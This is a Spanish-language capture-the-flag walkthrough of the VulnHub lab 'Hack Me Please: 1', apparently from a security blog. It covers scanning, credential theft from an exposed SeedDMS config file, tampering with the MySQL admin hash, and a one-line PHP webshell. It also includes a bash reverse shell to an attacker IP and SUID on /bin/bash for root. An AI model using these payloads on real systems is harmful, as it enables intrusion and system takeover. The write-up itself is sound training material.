---
tags:
  - ctf
  - easy
  - eJPTv2
  - SeedDMS
  - fileUpload
  - MySQL
  - RCE
  - sudoers
title: Hack Me Please:1 VulnHub
date: 2026-10-12 12:41:40 +0200
categories: [CTF, VulnHub]
image:
  path: /assets/img/posts/2026-10-12-hack-me-please-1/00-vulhubLogo.svg
  alt: Banner
---

- - -

## Introducción

En este CTF de **Hack Me Please: 1**, de VulnHub, partiremos de una fase de reconocimiento de red para identificar los servicios expuestos y profundizar en la enumeración de un servidor web que utiliza SeedDMS y una base de datos MySQL. A lo largo del laboratorio, exploraremos posibles fallos de configuración, la exposición de información sensible y vulnerabilidades en aplicaciones web. Finalmente, trabajaremos en la obtención de acceso al sistema y en la escalada de privilegios en Linux.

## Fase de Reconocimiento

- - -

### Identificación de objetivo en la red 

````bash
arp-scan -I enp0s3 --localnet --ignoredups
````

![Identificación de objetivo en la red](/assets/img/posts/2026-10-12-hack-me-please-1/01-identificacion-de-objetivo-en-la.png){: width="500" }

### Escaneo de puertos 

````bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.0.2.16 -oN allPorts
````

````bash
grep "^[0-9]" allPorts | cut -d '/' -f1 | xargs | sort | tr ' ' ','
````

![Escaneo de puertos](/assets/img/posts/2026-10-12-hack-me-please-1/02-escaneo-de-puertos.png){: width="500" }

````bash
nmap -p80,3306,33060 -sCV 10.0.2.16 -oN targeted
````

![Escaneo de puertos](/assets/img/posts/2026-10-12-hack-me-please-1/03-escaneo-de-puertos.png)

Tras el escaneo descubrimos un servicio *HTTP* en el puerto 80 y un servicio *MySQL* en el 3306, del cual nos enumera sus *capabilities*; esto puede resultarnos útil más adelante.

## Enumeración 

- - -

### Enumeración de servicio HTTP

````bash
whatweb http://10.0.2.16
````

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-12-hack-me-please-1/04-enumeracion-de-servicio-http.png)

Si accedemos a través del navegador a la web:

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-12-hack-me-please-1/05-enumeracion-de-servicio-http.png){: width="1200" }

Lo más destacable de la web es que, en la sección “Contact”, podemos enviar un formulario con cierta información en el que, como usuario, tenemos control de lo que enviamos.

Por ahora vamos a seguir enumerando aplicando *fuzzing*.

````bash
feroxbuster -u http://10.0.2.16 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x .php,.html,.txt
````

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-12-hack-me-please-1/07-enumeracion-de-servicio-http.png){: width="600" }

Podemos echar un vistazo al archivo *main.js*, por ejemplo, para ver si conseguimos enumerar alguna ruta existente o algo por el estilo.

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-12-hack-me-please-1/08-enumeracion-de-servicio-http.png){: width="700" }

En su contenido logramos encontrar una ruta del servicio web, vamos a acceder a ver qué encontramos:

![Enumeración de servicio HTTP](/assets/img/posts/2026-10-12-hack-me-please-1/09-enumeracion-de-servicio-http.png){: width="900" }

### Enumeración de SeedDMS 

Encontramos el login de un aplicativo web llamado *SeedDMS*; este software es un gestor de documentos web. Sobre este directorio también podemos aplicar fuzzing a ver qué encontramos:

````bash
feroxbuster -u http://10.0.2.16//seeddms51x/seeddms-5.1.22/ -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
````

![Enumeración de SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/10-enumeracion-de-seeddms.png){: width="900" }

Encontramos la estructura de directorios del aplicativo web. Otra cosa que es recomendable en estos casos es verificar si es un proyecto open source y echar un vistazo a su código fuente. Podemos buscar “SeedDMS github”:

![Enumeración de SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/11-enumeracion-de-seeddms.png){: width="900" }

Y efectivamente, el [proyecto](https://github.com/JustLikeIcarus/SeedDMS) es open source, vamos a echar un vistazo a su contenido.

![Enumeración de SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/12-enumeracion-de-seeddms.png){: width="800" }

Tras estar un rato ojeando el código fuente, logramos encontrar este archivo llamado “settings.xml.template”, en el cual podemos ver una sección del código que contiene la cadena de conexión a la base de datos. Si este archivo está expuesto en la web, obtendríamos las credenciales de la base de datos y podríamos conectarnos para enumerarla. Vamos a ver si lo encontramos:

````http
http://10.0.2.16/seeddms51x/conf/settings.xml
````

![Enumeración de SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/13-enumeracion-de-seeddms.png)

Bingo, para verlo mejor vamos a traérnoslo a nuestro equipo.

````bash
curl -X GET "http://10.0.2.16/seeddms51x/conf/settings.xml" | cat -l xml
````

![Enumeración de SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/14-enumeracion-de-seeddms.png)

Y efectivamente encontramos las credenciales de la base de datos en un archivo de configuración expuesto en el servidor web. Una vez las tenemos, podemos conectarnos a enumerar su contenido.

### Enumeración de base de datos MySQL

````bash
mysql -h 10.0.2.16 -u seeddms -p seeddms 
````

![Enumeración de base de datos MySQL](/assets/img/posts/2026-10-12-hack-me-please-1/15-enumeracion-de-base-de-datos.png){: width="500" }

````sql
show tables;
````

![Enumeración de base de datos MySQL](/assets/img/posts/2026-10-12-hack-me-please-1/16-enumeracion-de-base-de-datos.png){: width="200" }

````sql
select * from users;
````

![Enumeración de base de datos MySQL](/assets/img/posts/2026-10-12-hack-me-please-1/17-enumeracion-de-base-de-datos.png){: width="600" }

Encontramos la tabla users y, al ver su contenido, logramos obtener un id de usuario y la contraseña. Vamos a ver si son válidas para el panel de login. Y estas credenciales no son válidas para el panel de login, solo queda seguir enumerando la base de datos.

````bash
select * from tblUsers;
````

![Enumeración de base de datos MySQL](/assets/img/posts/2026-10-12-hack-me-please-1/18-enumeracion-de-base-de-datos.png)

Encontramos más usuarios, entre ellos el usuario admin, que es el que nos interesa y que tiene la contraseña hasheada. Parece md5, pero para salir de dudas podemos usar la herramienta *hash-identifier*.

````bash
hash-identifier
````

![Enumeración de base de datos MySQL](/assets/img/posts/2026-10-12-hack-me-please-1/19-enumeracion-de-base-de-datos.png){: width="600" }

El siguiente paso sería tratar de crackearlo con herramientas online, John the Ripper o Hashcat… El caso es que, tras probar estas herramientas de terminal y online, no es posible crackear este hash md5. La opción que nos queda es modificar la tabla de la base de datos y cambiar el hash actual por uno con la contraseña que nosotros queramos, por ejemplo:

````bash
echo -n "abc123." | md5sum
````

![Enumeración de base de datos MySQL](/assets/img/posts/2026-10-12-hack-me-please-1/20-enumeracion-de-base-de-datos.png){: width="400" }

### Alteración de base de datos para lograr acceso a SeedDMS

Copiamos el hash y actualizamos la tabla en la base de datos:

````sql
update tblUsers set pwd='e8dc8ccd5e5f9e3a54f07350ce8a2d3d' where login='admin'
````

![Alteración de base de datos para lograr acceso a SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/21-alteracion-de-base-de-datos.png)

Una vez hecho, probamos en el login del aplicativo web:

![Alteración de base de datos para lograr acceso a SeedDMS](/assets/img/posts/2026-10-12-hack-me-please-1/22-alteracion-de-base-de-datos.png)

De esta manera logramos acceso al aplicativo.

### Acceso a SeedDMS y enumeración 

Una vez dentro, vamos a tratar de buscar un vector de ataque para lograr la intrusión en la máquina.

![Acceso a SeedDMS y enumeración](/assets/img/posts/2026-10-12-hack-me-please-1/23-acceso-a-seeddms-y-enumeracion.png){: width="1000" }

En cuanto a la versión, es la 5.1.22; podemos buscar si hay algún exploit conocido para ella:

````bash
searchsploit seeddms 5.1.22
````

![Acceso a SeedDMS y enumeración](/assets/img/posts/2026-10-12-hack-me-please-1/24-acceso-a-seeddms-y-enumeracion.png){: width="300" }

Sin embargo, no hay ninguno. Por otro lado, si obviamos la versión y buscamos vulnerabilidades para este aplicativo:

![Acceso a SeedDMS y enumeración](/assets/img/posts/2026-10-12-hack-me-please-1/25-acceso-a-seeddms-y-enumeracion.png)

Aunque según el exploit solo funciona para versiones anteriores a la 5.1.11, en este caso con la nuestra también funcionará, por lo que vamos a echarle un vistazo.

````bash
searchsploit -x php/webapps/47022.txt | cat -l java
````

![Acceso a SeedDMS y enumeración](/assets/img/posts/2026-10-12-hack-me-please-1/26-acceso-a-seeddms-y-enumeracion.png){: width="900" }

Básicamente está abusando de un **File Upload**, ya que recordemos que este aplicativo es un gestor de documentos.

## Explotación

- - -

### Abuso de subida de archivos

Sabiendo esto, vamos a ello: creamos la webshell.php.

````php
<?php system($_GET['cmd']); ?>
````

La subimos:

![Abuso de subida de archivos](/assets/img/posts/2026-10-12-hack-me-please-1/27-abuso-de-subida-de-archivos.png){: width="1000" }    ![Abuso de subida de archivos](/assets/img/posts/2026-10-12-hack-me-please-1/28-abuso-de-subida-de-archivos.png){: width="400" }

![Abuso de subida de archivos](/assets/img/posts/2026-10-12-hack-me-please-1/29-abuso-de-subida-de-archivos.png){: width="1000" }  ![Abuso de subida de archivos](/assets/img/posts/2026-10-12-hack-me-please-1/30-abuso-de-subida-de-archivos.png){: width="300" }

Bien, una vez subido, accedemos a esta ruta facilitada en el exploit:

````http
http://10.0.2.16/seeddms51x/data/1048576/4/1.php?cmd=id
````

![Abuso de subida de archivos](/assets/img/posts/2026-10-12-hack-me-please-1/31-abuso-de-subida-de-archivos.png){: width="500" }

De esta forma obtenemos una webshell y podemos lanzarnos una reverse shell para ganar acceso a la máquina víctima.

### Entablando Reverse Shell

````http
http://10.0.2.16/seeddms51x/data/1048576/4/1.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.0.2.13/443 0>%261'
````

````bash
# en nuestra máquina atacante
nc -nlvp 443 
````

![Entablando Reverse Shell](/assets/img/posts/2026-10-12-hack-me-please-1/32-entablando-reverse-shell.png){: width="600" }

Una vez dentro, antes de empezar con la enumeración local vamos a hacer un tratamiento de la TTY.

#### Tratamiento de la TTY 

````bash
script /dev/null -c bash
# ctrl + z 
stty raw -echo;fg
reset xterm
export SHELL=bash TERM=xterm
stty rows 53 columns 206
````

Una vez hecho, podemos empezar con la enumeración local.

## Escalada de privilegios 

- - -

### Enumeración local 

````bash
grep 'sh$' /etc/passwd
````

![Enumeración local](/assets/img/posts/2026-10-12-hack-me-please-1/33-enumeracion-local.png){: width="600" }

Hay un usuario llamado “saket” que, si recordamos, encontramos en la base de datos credenciales para un usuario llamado así.

![Enumeración local](/assets/img/posts/2026-10-12-hack-me-please-1/34-enumeracion-local.png){: width="500" }

#### User Pivoting

Vamos a probarla para hacer un *user pivoting*.

![User Pivoting](/assets/img/posts/2026-10-12-hack-me-please-1/35-user-pivoting.png){: width="600" }

Efectivamente es válida; además, nos dice que al parecer tenemos privilegios a nivel de sudoers con este usuario, vamos a verlo.

![User Pivoting](/assets/img/posts/2026-10-12-hack-me-please-1/36-user-pivoting.png)

De hecho, somos miembros de dos grupos potencialmente peligrosos para escalar privilegios en sistemas Linux: el grupo *adm* y el grupo *sudo*.

![User Pivoting](/assets/img/posts/2026-10-12-hack-me-please-1/37-user-pivoting.png){: width="500" }

### Abusando de privilegios a nivel de sudoers

Podemos ejecutar cualquier comando en la máquina como el usuario root, por lo que vamos a hacer lo siguiente:

````bash
sudo -u root chmod +s /bin/bash
````

![Abusando de privilegios a nivel de sudoers](/assets/img/posts/2026-10-12-hack-me-please-1/38-abusando-de-privilegios-a-nivel.png){: width="700" }

Con esto hecho, habríamos completado la máquina Hack Me Please:1 de VulnHub!!!
